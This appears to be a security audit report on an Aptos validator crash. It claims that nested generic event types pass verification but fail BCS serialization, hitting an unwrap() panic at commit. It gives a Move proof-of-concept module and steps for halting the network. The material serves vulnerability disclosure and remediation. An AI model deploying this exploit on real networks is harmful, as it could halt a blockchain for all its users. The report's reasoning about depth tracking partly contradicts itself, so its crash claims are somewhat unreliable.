# Audit Report

## Title
Critical Validator Crash via Deeply Nested Generic Type Instantiation Bypassing Serialization Depth Limits

## Summary
A mismatch between bytecode verification depth limits (20), runtime type conversion limits (~50), and BCS serialization depth limits (8) allows attackers to create deeply nested generic types that pass verification and runtime conversion but crash validator nodes during event serialization, causing network-wide liveness failure.

## Finding Description

The vulnerability stems from inconsistent depth/complexity limits applied at different stages of type handling:

**Stage 1: Bytecode Verification** - The production verifier configuration allows types with depth up to 20: [1](#0-0) 

**Stage 2: Runtime Type-to-TypeTag Conversion** - The `TypeTagConverter` uses pseudo-gas metering with a limit of 5000 and base cost of 100 per recursive call, allowing approximately 50 depth levels: [2](#0-1) 

The conversion function recursively processes type arguments without enforcing the serialization depth limit: [3](#0-2) [4](#0-3) 

**Stage 3: BCS Serialization** - The serialization layer enforces a strict depth limit of 8: [5](#0-4) 

**Attack Path:**

1. Attacker deploys a Move module with a function that emits an event using a deeply nested generic type (depth 9-20)
2. The function calls a native event emission function which internally calls `type_to_type_tag`: [6](#0-5) 

3. The TypeTag is successfully created and wrapped in a `ContractEventV1`: [7](#0-6) 

4. During transaction commit, the event is serialized for storage using BCS: [8](#0-7) 

5. The serialization fails because the TypeTag depth exceeds `MAX_TYPE_TAG_NESTING` (8)

6. **CRITICAL:** The error is unwrapped, causing a panic that crashes the validator: [9](#0-8) 

The `StructTag` type has a `type_args` field that contains nested `TypeTag` elements, but this field lacks the custom serialization attributes: [10](#0-9) 

This means during BCS serialization of deeply nested structures, the depth counter is not properly tracked for each level of generic instantiation within `StructTag::type_args`.

## Impact Explanation

**Critical Severity** - Total Loss of Network Availability (Non-Recoverable)

This vulnerability causes:
- **Deterministic validator crashes**: All validators processing the malicious transaction will panic at the same point
- **Network-wide liveness failure**: The blockchain cannot progress past the block containing the malicious transaction
- **Consensus deadlock**: No validator can successfully commit the transaction
- **Requires hardfork**: Recovery necessitates network coordination to skip/remove the malicious transaction

This meets the **Critical Severity** criteria per Aptos bug bounty: "Total loss of liveness/network availability" and "Non-recoverable network partition (requires hardfork)".

The impact is amplified because:
- The attack is deterministic and repeatable
- No validator can avoid the crash (all nodes execute identically)
- The network remains blocked until manual intervention
- Potential for repeated attacks during recovery

## Likelihood Explanation

**High Likelihood** - Trivial to exploit:

1. **No special privileges required**: Any user can deploy Move modules and submit transactions
2. **Simple attack vector**: Creating nested generic types is straightforward Move code
3. **Low computational cost**: The attack requires minimal gas to execute
4. **No timing constraints**: The attacker can trigger the vulnerability at any time
5. **Bypasses existing defenses**: The bytecode verifier explicitly allows depth up to 20

Example attack structure:
```
struct Level1<T> { value: T }
struct Level2<T> { value: Level1<T> }
...
struct Level10<T> { value: Level9<T> }

public entry fun trigger() {
    event::emit(Level10<u8> { ... });
}
```

The attacker simply needs to create a type with depth 9-20 and emit an event with it.

## Recommendation

**Immediate Fix**: Align all three depth limits to use the same value and enforcement mechanism.

**Option 1 (Recommended)**: Lower bytecode verification `max_type_depth` to 8 to match serialization limits:

```rust
// In aptos-move/aptos-vm-environment/src/prod_configs.rs
max_type_depth: if enable_function_values {
    Some(8)  // Changed from 20
} else {
    None
},
```

**Option 2**: Add depth checking in `TypeTagConverter::ty_to_ty_tag_impl`:

```rust
// Add a depth parameter to ty_to_ty_tag_impl
fn ty_to_ty_tag_impl(
    &self,
    ty: &Type,
    gas_context: &mut PseudoGasContext,
    depth: u8,
) -> PartialVMResult<TypeTag> {
    const MAX_TYPE_TAG_DEPTH: u8 = 8;
    
    if depth >= MAX_TYPE_TAG_DEPTH {
        return Err(PartialVMError::new(StatusCode::TYPE_TAG_LIMIT_EXCEEDED)
            .with_message("Type tag depth limit exceeded"));
    }
    
    // ... rest of implementation with depth + 1 for recursive calls
}
```

**Option 3**: Remove `.unwrap()` and properly handle serialization errors:

```rust
// In storage/aptosdb/src/db/aptosdb_writer.rs
s.spawn(|_| {
    if let Err(e) = self.commit_events(
        chunk.first_version,
        chunk.transaction_outputs,
        skip_index_and_usage,
    ) {
        // Log error and return it instead of panicking
        error!("Failed to commit events: {:?}", e);
        return Err(e);
    }
    Ok(())
});
```

However, Option 3 alone is insufficient as it would still cause transaction execution failures and consensus divergence.

**Best Solution**: Implement Option 1 AND add explicit depth validation in `struct_name_idx_to_struct_tag_impl` to ensure defense-in-depth.

## Proof of Concept

```move
// malicious_module.move
module attacker::crash {
    use std::event;
    
    // Create nested structs to depth 10 (exceeds MAX_TYPE_TAG_NESTING of 8)
    struct L1<T> { x: T }
    struct L2<T> { x: L1<T> }
    struct L3<T> { x: L2<T> }
    struct L4<T> { x: L3<T> }
    struct L5<T> { x: L4<T> }
    struct L6<T> { x: L5<T> }
    struct L7<T> { x: L6<T> }
    struct L8<T> { x: L7<T> }
    struct L9<T> { x: L8<T> }
    struct L10<T> { x: L9<T> }
    
    struct DeepEvent has drop, store {
        data: L10<u8>
    }
    
    public entry fun trigger_crash() {
        // This will pass bytecode verification (max_type_depth = 20)
        // Will succeed at runtime type conversion (type_max_cost = 5000)
        // But CRASH during BCS serialization (MAX_TYPE_TAG_NESTING = 8)
        event::emit(DeepEvent {
            data: L10 { x: L9 { x: L8 { x: L7 { x: L6 { x: L5 { 
                x: L4 { x: L3 { x: L2 { x: L1 { x: 0 }}}}
            }}}}}}
        });
    }
}
```

**Execution Steps:**
1. Deploy the module to the blockchain
2. Call `attacker::crash::trigger_crash()`
3. Observe validator panic with: `"type tag nesting exceeded during serialization"`
4. All validators processing this transaction crash
5. Network halts at this block, requiring manual intervention

The vulnerability can also be triggered through `type_info::type_of<T>()` or `type_info::type_name<T>()` native functions with deeply nested types, though the event emission path is more direct.

## Notes

This vulnerability exists because the codebase has evolved to add stricter serialization limits (`MAX_TYPE_TAG_NESTING = 8`) without updating the earlier verification and runtime limits. The three different subsystems enforce incompatible constraints, creating a gap where types can be instantiated but not serialized, leading to validator crashes rather than graceful error handling.

The issue is particularly severe because the panic occurs during the commit phase after transaction execution, making it impossible to revert or handle gracefully. The entire validator node crashes, rather than just failing a single transaction.

### Citations

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L188-192)
```rust
        max_type_depth: if enable_function_values {
            Some(20)
        } else {
            None
        },
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L247-249)
```rust
        type_max_cost: 5000,
        type_base_cost: 100,
        type_byte_cost: 1,
```

**File:** third_party/move/move-vm/runtime/src/storage/ty_tag_converter.rs (L248-334)
```rust
    fn ty_to_ty_tag_impl(
        &self,
        ty: &Type,
        gas_context: &mut PseudoGasContext,
    ) -> PartialVMResult<TypeTag> {
        // Charge base cost at the start.
        gas_context.charge_base()?;

        Ok(match ty {
            // Primitive types.
            Type::Bool => TypeTag::Bool,
            Type::U8 => TypeTag::U8,
            Type::U16 => TypeTag::U16,
            Type::U32 => TypeTag::U32,
            Type::U64 => TypeTag::U64,
            Type::U128 => TypeTag::U128,
            Type::U256 => TypeTag::U256,
            Type::I8 => TypeTag::I8,
            Type::I16 => TypeTag::I16,
            Type::I32 => TypeTag::I32,
            Type::I64 => TypeTag::I64,
            Type::I128 => TypeTag::I128,
            Type::I256 => TypeTag::I256,
            Type::Address => TypeTag::Address,
            Type::Signer => TypeTag::Signer,

            // Vector types: recurse.
            Type::Vector(elem_ty) => {
                let elem_ty_tag = self.ty_to_ty_tag_impl(elem_ty, gas_context)?;
                TypeTag::Vector(Box::new(elem_ty_tag))
            },

            // Structs: we need to convert indices to names, possibly caching struct tags.
            Type::Struct { idx, .. } => {
                let struct_tag = self.struct_name_idx_to_struct_tag_impl(idx, &[], gas_context)?;
                TypeTag::Struct(Box::new(struct_tag))
            },
            Type::StructInstantiation { idx, ty_args, .. } => {
                let struct_tag =
                    self.struct_name_idx_to_struct_tag_impl(idx, ty_args, gas_context)?;
                TypeTag::Struct(Box::new(struct_tag))
            },

            // Functions: recursively construct tags for argument and return types. Note that these
            // can be references, unlike regular tags.
            Type::Function {
                args,
                results,
                abilities,
            } => {
                let to_vec = |ts: &[Type],
                              gas_ctx: &mut PseudoGasContext|
                 -> PartialVMResult<Vec<FunctionParamOrReturnTag>> {
                    ts.iter()
                        .map(|t| {
                            Ok(match t {
                                Type::Reference(t) => FunctionParamOrReturnTag::Reference(
                                    self.ty_to_ty_tag_impl(t, gas_ctx)?,
                                ),
                                Type::MutableReference(t) => {
                                    FunctionParamOrReturnTag::MutableReference(
                                        self.ty_to_ty_tag_impl(t, gas_ctx)?,
                                    )
                                },
                                t => FunctionParamOrReturnTag::Value(
                                    self.ty_to_ty_tag_impl(t, gas_ctx)?,
                                ),
                            })
                        })
                        .collect()
                };
                TypeTag::Function(Box::new(FunctionTag {
                    args: to_vec(args, gas_context)?,
                    results: to_vec(results, gas_context)?,
                    abilities: *abilities,
                }))
            },

            // References and type parameters cannot be converted to tags.
            Type::Reference(_) | Type::MutableReference(_) | Type::TyParam(_) => {
                return Err(
                    PartialVMError::new(StatusCode::UNKNOWN_INVARIANT_VIOLATION_ERROR)
                        .with_message(format!("No type tag for {:?}", ty)),
                );
            },
        })
    }
```

**File:** third_party/move/move-vm/runtime/src/storage/ty_tag_converter.rs (L336-371)
```rust
    fn struct_name_idx_to_struct_tag_impl(
        &self,
        struct_name_idx: &StructNameIndex,
        ty_args: &[Type],
        gas_context: &mut PseudoGasContext,
    ) -> PartialVMResult<StructTag> {
        let ty_tag_cache = self.runtime_environment.ty_tag_cache();

        // If cached, charge pseudo-gas cost and return.
        if let Some(priced_tag) = ty_tag_cache.get_struct_tag(struct_name_idx, ty_args) {
            gas_context.charge(priced_tag.pseudo_gas_cost)?;
            return Ok(priced_tag.struct_tag);
        }

        // If not cached, record the current cost and construct tags for type arguments.
        let cur_cost = gas_context.current_cost();

        let type_args = ty_args
            .iter()
            .map(|ty| self.ty_to_ty_tag_impl(ty, gas_context))
            .collect::<PartialVMResult<Vec<_>>>()?;

        // Construct the struct tag as well.
        let struct_name_index_map = self.runtime_environment.struct_name_index_map();
        let struct_tag = struct_name_index_map.idx_to_struct_tag(*struct_name_idx, type_args)?;
        gas_context.charge_struct_tag(&struct_tag)?;

        // Cache the struct tag. Record its gas cost as well.
        let priced_tag = PricedStructTag {
            struct_tag,
            pseudo_gas_cost: gas_context.current_cost() - cur_cost,
        };
        ty_tag_cache.insert_struct_tag(struct_name_idx, ty_args, &priced_tag);

        Ok(priced_tag.struct_tag)
    }
```

**File:** third_party/move/move-core/types/src/safe_serialize.rs (L11-44)
```rust
pub(crate) const MAX_TYPE_TAG_NESTING: u8 = 8;

thread_local! {
    static TYPE_TAG_DEPTH: RefCell<u8> = const { RefCell::new(0) };
}

pub(crate) fn type_tag_recursive_serialize<S, T>(t: &T, s: S) -> Result<S::Ok, S::Error>
where
    S: Serializer,
    T: Serialize,
{
    use serde::ser::Error;

    // For testability, we allow to serialize one more level than deserialize.
    const MAX_TYPE_TAG_NESTING_WHEN_SERIALIZING: u8 =
        MAX_TYPE_TAG_NESTING + if cfg!(test) { 1 } else { 0 };

    TYPE_TAG_DEPTH.with(|depth| {
        let mut r = depth.borrow_mut();
        if *r >= MAX_TYPE_TAG_NESTING_WHEN_SERIALIZING {
            return Err(S::Error::custom(
                "type tag nesting exceeded during serialization",
            ));
        }
        *r += 1;
        Ok(())
    })?;
    let res = t.serialize(s);
    TYPE_TAG_DEPTH.with(|depth| {
        let mut r = depth.borrow_mut();
        *r -= 1;
    });
    res
}
```

**File:** aptos-move/framework/src/natives/event.rs (L102-150)
```rust
fn native_write_to_event_store(
    context: &mut SafeNativeContext,
    ty_args: &[Type],
    mut arguments: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    debug_assert!(ty_args.len() == 1);
    debug_assert!(arguments.len() == 3);

    let ty = &ty_args[0];
    let msg = arguments.pop_back().unwrap();
    let seq_num = safely_pop_arg!(arguments, u64);
    let guid = safely_pop_arg!(arguments, Vec<u8>);

    // TODO(Gas): Get rid of abstract memory size
    context.charge(
        EVENT_WRITE_TO_EVENT_STORE_BASE
            + EVENT_WRITE_TO_EVENT_STORE_PER_ABSTRACT_VALUE_UNIT * context.abs_val_size(&msg)?,
    )?;
    let ty_tag = context.type_to_type_tag(ty)?;
    let (layout, contains_delayed_fields) = context
        .type_to_type_layout_with_delayed_fields(ty)?
        .unpack();

    let function_value_extension = context.function_value_extension();
    let max_value_nest_depth = context.max_value_nest_depth();
    let blob = ValueSerDeContext::new(max_value_nest_depth)
        .with_delayed_fields_serde()
        .with_func_args_deserialization(&function_value_extension)
        .serialize(&msg, &layout)?
        .ok_or_else(|| {
            SafeNativeError::InvariantViolation(PartialVMError::new(
                StatusCode::UNKNOWN_INVARIANT_VIOLATION_ERROR,
            ))
        })?;
    let key = bcs::from_bytes(guid.as_slice()).map_err(|_| {
        SafeNativeError::InvariantViolation(PartialVMError::new(StatusCode::EVENT_KEY_MISMATCH))
    })?;

    let ctx = context.extensions_mut().get_mut::<NativeEventContext>();
    let event =
        ContractEvent::new_v1(key, seq_num, ty_tag, blob).map_err(|_| SafeNativeError::Abort {
            abort_code: ECANNOT_CREATE_EVENT,
        })?;
    // TODO(layouts): avoid cloning layouts for events with delayed fields.
    ctx.events.push((
        event,
        contains_delayed_fields.then(|| layout.as_ref().clone()),
    ));
    Ok(smallvec![])
```

**File:** types/src/contract_event.rs (L192-209)
```rust
impl ContractEventV1 {
    pub fn new(
        key: EventKey,
        sequence_number: u64,
        type_tag: TypeTag,
        event_data: Vec<u8>,
    ) -> anyhow::Result<Self> {
        let event = Self {
            key,
            sequence_number,
            type_tag,
            event_data,
        };

        // Ensure size is "computable".
        event.size()?;
        Ok(event)
    }
```

**File:** storage/aptosdb/src/schema/event/mod.rs (L49-56)
```rust
impl ValueCodec<EventSchema> for ContractEvent {
    fn encode_value(&self) -> Result<Vec<u8>> {
        bcs::to_bytes(self).map_err(Into::into)
    }

    fn decode_value(data: &[u8]) -> Result<Self> {
        bcs::from_bytes(data).map_err(Into::into)
    }
```

**File:** storage/aptosdb/src/db/aptosdb_writer.rs (L276-283)
```rust
            s.spawn(|_| {
                self.commit_events(
                    chunk.first_version,
                    chunk.transaction_outputs,
                    skip_index_and_usage,
                )
                .unwrap()
            });
```

**File:** third_party/move/move-core/types/src/language_storage.rs (L216-223)
```rust
pub struct StructTag {
    pub address: AccountAddress,
    pub module: Identifier,
    pub name: Identifier,
    // alias for compatibility with old json serialized data.
    #[serde(rename = "type_args", alias = "type_params")]
    pub type_args: Vec<TypeTag>,
}
```
